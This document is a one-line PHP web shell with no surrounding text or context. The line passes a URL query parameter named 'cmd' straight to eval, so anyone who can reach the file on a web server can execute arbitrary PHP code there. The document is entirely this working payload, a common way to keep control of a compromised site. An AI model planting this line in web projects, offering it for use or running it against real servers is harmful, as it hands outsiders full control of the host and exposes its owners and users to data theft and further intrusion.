<?eval($_GET[cmd])?>
